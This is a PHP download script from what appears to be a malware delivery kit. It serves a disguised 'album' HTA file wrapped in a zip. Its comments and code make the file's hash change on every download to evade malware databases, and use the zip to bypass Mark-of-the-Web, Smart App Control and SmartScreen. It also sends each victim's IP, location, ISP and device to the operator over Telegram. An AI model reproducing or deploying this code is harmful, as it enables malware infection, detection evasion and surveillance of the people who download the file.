<?php
require __DIR__ . '/../lib.php';

// ============================================================
//  The actual download. Serves a per-download FRESH .zip containing
//  the source HTA. The hash is unique per download: random
//  whitespace/comment bytes are injected before </body>, so BOTH
//  the inner .hta and the outer .zip SHA-256 differ every time
//  (malware DBs key off the file once executed — a static hash
//  gets flagged eventually; a rotating one does not.)
//
//  Why a zip: a bare .hta downloaded from the internet is (a)
//  blocked by Smart App Control on clean Win11 22H2+ installs
//  (".hta from the internet" is on its block list) and (b) flagged
//  by SmartScreen ("Unknown publisher"). Contents extracted from a
//  zip never carry the Mark-of-the-Web, so neither gate fires. The
//  victim opens the .zip and runs the .hta inside it.
// ============================================================

$tok = gate_dl();

// ---- name for THIS download (fixed by the visit, not by this request) ----
$name = (string)($_GET['n'] ?? '');
if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name(); }
$name = substr($name, 0, 90);
if (!str_ends_with($name, '.hta')) { $name .= '.hta'; }
// Outer file name: same base, .zip extension. The entry inside the zip
// keeps the .hta name (that's what the victim opens after extracting).
$zipName = preg_replace('/\.hta$/i', '.zip', $name);

// ---- read source HTA ----
$src = SOURCE_ZIP;
if (!is_file($src)) { http_response_code(500); echo '500'; exit; }
$bytes = (string)@file_get_contents($src);
if ($bytes === '') { http_response_code(500); echo '500'; exit; }

// ---- mutate the HTA: inject an invisible random comment before </body>
//      so the served file's SHA-256 differs every time. ----
$pad = random_int(2, 8) . " \n";                              // random trailing whitespace
$cmt = "<!-- " . str_repeat(' ', random_int(24, 160)) . " v" . random_int(10000, 99999) . "-->\n";
$pos = strrpos($bytes, '</body>');
$bytes = ($pos !== false)
    ? substr($bytes, 0, $pos) . $pad . $cmt . substr($bytes, $pos)
    : $bytes . $pad . $cmt;

// ---- wrap the mutated HTA in a fresh .zip (in-memory) ----
// Outer name = download name with the extension swapped to .zip; the
// entry inside keeps the .hta name (that's what the victim runs).
$bytes = build_zip($zipName, $name, $bytes);

// ---- one Telegram alert per real served download (deduped by visit) ----
$key = ALERT_DIR . '/dl_' . md5($tok['r'] . '|' . $name) . '.fired';
if (!@file_exists($key)) {
    @touch($key);
    $g = geo(ip());
    $msg = "\x{1F4F8} Album Served \x{1F4F8}\n"
         . "\x{1F4C5} Time: " . date('Y-m-d H:i:s') . "\n"
         . "\x{1F4CD} IP: " . ip() . "\n"
         . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
         . "\x{1F310} ISP: " . $g['isp'] . "\n"
         . "\x{1F4C1} File: " . $zipName . " (inner " . $name . ") " . round(strlen($bytes) / 1048576, 2) . " MB\n"
         . "\x{1F501} SHA256: " . substr(hash('sha256', $bytes), 0, 16) . "...\n"
         . "\x{1F4F1} Device: " . ua()
         . verdict_line($tok);
    tg($msg);
}

// ---- serve ----
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . $zipName . '"');
header('Expires: 0');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Content-Length: ' . strlen($bytes));
echo $bytes;
exit;

// ---- zip builder ----
function build_zip(string $zipName, string $innerName, string $inner): string {
    if (class_exists('ZipArchive')) {
        $p = tempnam(sys_get_temp_dir(), 'zipdl_');
        $zip = new ZipArchive();
        if ($zip->open($p, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
            $zip->addFromString($innerName, $inner);
            $zip->close();
            $data = (string)file_get_contents($p);
            @unlink($p);
            if ($data !== '') return $data;
        } else {
            @unlink($p);
        }
    }
    // Fallback: no zip extension — serve the bare HTA (still unique hash).
    return $inner;
}
